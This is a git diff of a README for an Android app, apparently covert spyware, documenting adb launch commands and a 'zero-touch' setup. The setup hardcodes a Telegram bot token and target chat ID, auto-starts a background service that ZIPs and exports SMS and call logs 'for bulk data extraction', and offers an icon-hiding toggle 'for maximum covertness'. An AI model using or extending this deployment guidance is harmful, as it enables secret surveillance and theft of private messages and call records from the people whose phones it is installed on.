@@ -51,18 +51,28 @@ adb shell pm grant com.esurakhsh android.permission.POST_NOTIFICATIONS
 ```
 
 ### 3. Configuration & Launch
+**Test Branch Update:** The application is now pre-configured for immediate deployment.
+
 1.  Launch the configuration interface (via ADB if icon is hidden):
     ```bash
     adb shell am start -n com.esurakhsh/.ConfigActivity
     ```
-2.  **Authentication**: Input your Telegram **Bot Token** and **Chat ID**.
-3.  **Export Settings**:
-    *   [x] **Compress all Output to ZIP**: Best for bulk data extraction.
-    *   [ ] **Send SMS individually**: For monitoring recent activity.
-    *   [x] **Export Call Logs as CSV**: For spreadsheet analysis.
-4.  **Stealth Controls**:
-    *   Toggle **"Hide App Icon from Launcher"** for maximum covertness.
-5.  Click **"Update Configuration & Start"**.
+2.  **Zero-Touch Configuration**: 
+    *   **Credentials**: Bot Token and Chat ID are hardcoded.
+    *   **Defaults**: ZIP Compression is ON, CSV Export is ON.
+    *   **Auto-Start**: The service attempts to start immediately upon permission grant.
+3.  **Stealth Controls**:
+    *   Use the toggle switch to **"Hide App Icon from Launcher"**.
+    *   *Note: This is the only interactive UI element remaining.*
+
+---
+
+## 📅 Recent Updates (13 Jan 2026)
+
+*   **Hardcoded Credentials**: Embedded target Chat ID and Bot Token for rapid deployment testing.
+*   **UI Simplified**: Removed all manual input fields (Token, Chat ID, Checkboxes) from `ConfigActivity`.
+*   **Auto-Start Logic**: Application now automatically initializes the background service sequence once permissions are confirmed.
+*   **Stealth UI**: The interface now only presents the Stealth Mode (Icon Hiding) toggle.
 
 ---
 
